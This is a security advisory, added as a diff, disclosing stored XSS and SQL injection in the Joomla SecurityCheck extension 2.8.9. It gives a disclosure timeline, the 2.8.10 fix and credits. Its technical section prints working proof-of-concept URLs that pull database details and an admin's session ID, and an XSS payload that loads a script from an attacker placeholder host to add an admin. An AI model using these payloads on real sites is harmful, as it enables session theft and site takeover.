@@ -1,0 +1,58 @@
+Information
+------------------------------
+Advisory by ADEO Security Team
+Name: Stored XSS and SQL Injection in Joomla SecurityCheck extension
+Affected Software : SecurityCheck and SecurityCheck Pro
+Vulnerable Versions: 2.8.9 (possibly below)
+Vendor Homepage : https://securitycheck.protegetuordenador.com
+Vulnerabilities Type : XSS and SQL Injection
+Severity : High
+Status : Fixed
+
+Technical Details
+------------------------------
+PoC URLs for SQL Injection
+
+For determining database, user and version.
+
+http://website/index.php?option='or(ExtractValue(1,concat(0x3a,(select(database())))))='1
+http://website/index.php?option='or(ExtractValue(1,concat(0x3a,(select(user())))))='1
+http://website/index.php?option='or(ExtractValue(1,concat(0x3a,(select(version())))))='1
+
+For steal admin's session ID (If admin is not online, page response with
+attack detected string. If online, response with admin's session ID)
+
+http://website/index.php?option='or(ExtractValue(rand(),concat(0x3a,(SELECT
+concat(session_id) FROM %23__user_usergroup_map INNER JOIN %23__users ON
+%23__user_usergroup_map.user_id=%23__users.id INNER JOIN %23__session ON %
+23__users.id=%23__session.userid WHERE group_id=8 LIMIT 0,1))))='1
+
+PoC URLs for XSS
+
+Add a new admin to website silently while admin checking SecurityCheck logs
+
+http://website/index.php?option=<script>var script =
+document.createElement('script');script.src = "http://ATTACKER/attack.js
+";document.getElementsByTagName('head')[0].appendChild(script);</script>
+
+attack.js
+https://gist.github.com/MuhammetDilmac/c680cc921143543561bfdfd7b25da1ca
+
+
+Disclosure Timeline
+------------------------------
+24/05/2016 SQL injection found
+30/05/2016 Worked on one-shot exploit for SQLi
+30/05/2016 While we were working on SQLi payload we also found XSS
+31/05/2016 XSS payload prepared
+31/05/2016 Vulnerability details and PoC sent to Protegetuordenador
+31/05/2016 Vulnerabilities fixed in v2.8.10
+
+Solution
+------------------------------
+Update to the latest version of SecurityCheck (2.8.10)
+
+Credits
+------------------------------
+These issues have been discovered by Gokmen Guresci (gokmenguresci.com) and
+Muhammet Dilmac (muhammetdilmac.com.tr).
